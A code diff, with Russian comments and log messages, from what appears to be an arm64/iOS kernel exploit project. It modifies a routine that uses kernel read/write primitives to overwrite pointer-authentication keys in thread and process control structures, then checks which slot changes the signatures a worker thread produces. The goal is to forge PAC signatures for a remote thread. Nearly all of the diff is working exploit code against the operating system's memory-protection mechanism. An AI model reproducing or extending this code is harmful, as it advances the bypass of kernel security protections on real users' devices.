@@ -135,6 +135,9 @@ __attribute__((noinline)) static void *kp_pacworker(void *arg)
             : "x16", "x17", "memory");
         g_pac_out = v;
         g_pac_out_b = vb;
+        // блокировка → возврат в юзерленд перезагружает PAC-ключи из machine
+        // контекста; без сисколла CPU держит старые ключи (доказано v6)
+        usleep(200);
     }
     return NULL;
 }
@@ -195,31 +198,43 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
     uint64_t baselineB = g_pac_out_b;
     paclog(@"    [rp] baseline: pacia=%#llx pacib=%#llx", baseline, baselineB);
 
-    // live key swap — только подтверждённый слот +0xE8 и только в kernel VA
-    if (do_swap)
-        kp_rc_kwrite64(upcb + 0xE8, keyb_u);
-    uint64_t rb = upcb_ok ? kp_rc_kread64(upcb + 0xE8) : 0;
-    paclog(@"    [rp] upcb IB после swap=%#llx", rb);
-
-    uint64_t newsig = baseline, newsigB = baselineB;
-    for (int i = 0; i < 300; i++) {
+    // v7: worker спит в каждой итерации → возврат в юзерленд перезагружает
+    // ключи. Фаза A: thread_t +0x1B0/+0x1B8 (v3-стиль). Фаза B: upcb +0xE8.
+    uint64_t t_oa = kp_rc_kread64(kva + 0x1B0);
+    uint64_t t_ob = kp_rc_kread64(kva + 0x1B8);
+    kp_rc_kwrite64(kva + 0x1B0, keya);
+    kp_rc_kwrite64(kva + 0x1B8, keyb);
+    paclog(@"    [rp] фаза A: thread_t keys записаны (a=%#llx b=%#llx) — жду 1с…", keya, keyb);
+    uint64_t sigA = baseline, sigAB = baselineB;
+    for (int i = 0; i < 1000; i++) {
         usleep(1000);
-        if (g_pac_out != baseline || g_pac_out_b != baselineB) { newsig = g_pac_out; newsigB = g_pac_out_b; break; }
+        if (g_pac_out != baseline || g_pac_out_b != baselineB) { sigA = g_pac_out; sigAB = g_pac_out_b; break; }
     }
-    newsig = g_pac_out; newsigB = g_pac_out_b;
-    paclog(@"    [rp] после swap: pacia=%#llx pacib=%#llx — %@", newsig, newsigB,
-           newsigB != baselineB ? @"pacib ИЗМЕНИЛАСЬ — upcb ЖИВОЕ хранилище!" : @"pacib не изменилась за 300мс");
+    sigA = g_pac_out; sigAB = g_pac_out_b;
+    paclog(@"    [rp] фаза A: pacia=%#llx pacib=%#llx — %@", sigA, sigAB,
+           (sigA != baseline || sigAB != baselineB) ? @"ИЗМЕНИЛАСЬ — источник = thread_t!" : @"без изменений");
+    kp_rc_kwrite64(kva + 0x1B0, t_oa);
+    kp_rc_kwrite64(kva + 0x1B8, t_ob);
 
-    // restore original IB — только если реально писали
+    // фаза B: upcb +0xE8 (только если оба upcb — kernel VA)
+    uint64_t sigB = sigA, sigBB = sigAB;
     if (do_swap) {
+        kp_rc_kwrite64(upcb + 0xE8, keyb_u);
+        paclog(@"    [rp] фаза B: upcb+0xE8=%#llx — жду 1с…", keyb_u);
+        for (int i = 0; i < 1000; i++) {
+            usleep(1000);
+            if (g_pac_out != sigA || g_pac_out_b != sigAB) { sigB = g_pac_out; sigBB = g_pac_out_b; break; }
+        }
+        sigB = g_pac_out; sigBB = g_pac_out_b;
+        paclog(@"    [rp] фаза B: pacia=%#llx pacib=%#llx — %@", sigB, sigBB,
+               (sigB != sigA || sigBB != sigAB) ? @"pacib ИЗМЕНИЛАСЬ — источник = upcb!" : @"без изменений");
         kp_rc_kwrite64(upcb + 0xE8, ob);
-        uint64_t rb2 = kp_rc_kread64(upcb + 0xE8);
-        paclog(@"    [rp] restore: %@", (rb2 == ob) ? @"вернули" : @"НЕ ВЕРНУЛИ!");
+        paclog(@"    [rp] restore: %@", (kp_rc_kread64(upcb + 0xE8) == ob) ? @"вернули" : @"НЕ ВЕРНУЛИ!");
     }
 
     g_pac_stop = 1;
     for (int i = 0; i < 100; i++) usleep(1000); // let the worker see the flag and exit
-    return newsig;
+    return (sigB != baseline) ? sigB : sigBB;
 }
 
 // upcb key-slot discovery READ-ONLY: two same-task threads — key slots hold
